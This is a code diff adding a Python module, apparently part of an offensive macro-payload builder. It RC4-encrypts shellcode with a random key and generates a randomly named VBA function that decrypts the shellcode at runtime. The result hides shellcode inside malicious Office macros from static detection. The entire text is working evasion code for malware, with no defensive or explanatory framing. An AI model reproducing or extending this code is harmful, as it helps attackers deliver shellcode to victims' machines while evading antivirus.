@@ -1,0 +1,64 @@
+import os
+from utils.utils import bytes_to_vba
+from Crypto.Cipher import ARC4
+import string
+import random
+
+class RC4Encrypt:
+
+    def __init__(self):
+        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
+        self.key = os.urandom(16)
+
+    def compilerOptions(self):
+        return []
+
+    def imports(self):
+        return []
+
+    def codeblock(self):
+        return """
+Function {name}(ciphertext() As Byte) As Byte()
+    {key}
+    Dim S(0 To 255) As Byte
+    Dim i As Long, j As Long, k As Long, t As Byte, n As Long
+    Dim keyLen As Long, cipherLen As Long
+    Dim outBytes() As Byte
+
+    keyLen = UBound(key) - LBound(key) + 1
+
+    ' --- Key Scheduling Algorithm (KSA) ---
+    For i = 0 To 255
+        S(i) = i
+    Next i
+
+    j = 0
+    For i = 0 To 255
+        j = (j + S(i) + key(LBound(key) + (i Mod keyLen))) Mod 256
+        t = S(i): S(i) = S(j): S(j) = t     ' swap
+    Next i
+
+    ' --- Pseudo-Random Generation Algorithm (PRGA) ---
+    cipherLen = UBound(ciphertext) - LBound(ciphertext) + 1
+    ReDim outBytes(0 To cipherLen - 1)
+
+    i = 0: j = 0
+    For n = 0 To cipherLen - 1
+        i = (i + 1) Mod 256
+        j = (j + S(i)) Mod 256
+        t = S(i): S(i) = S(j): S(j) = t     ' swap
+        k = S((CLng(S(i)) + CLng(S(j))) Mod 256)
+        outBytes(n) = ciphertext(LBound(ciphertext) + n) Xor k
+    Next n
+
+    {name} = outBytes
+End Function
+""".format(name=self.name, key = bytes_to_vba(self.key, 'key'), shellcodeSize=self.shellcodeSize)
+
+    def encode(self, plaintext):
+        self.shellcodeSize = len(plaintext)
+        cipher = ARC4.new(self.key)
+        return cipher.encrypt(plaintext)
+
+    def transformer(self, shellcodestring):
+        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
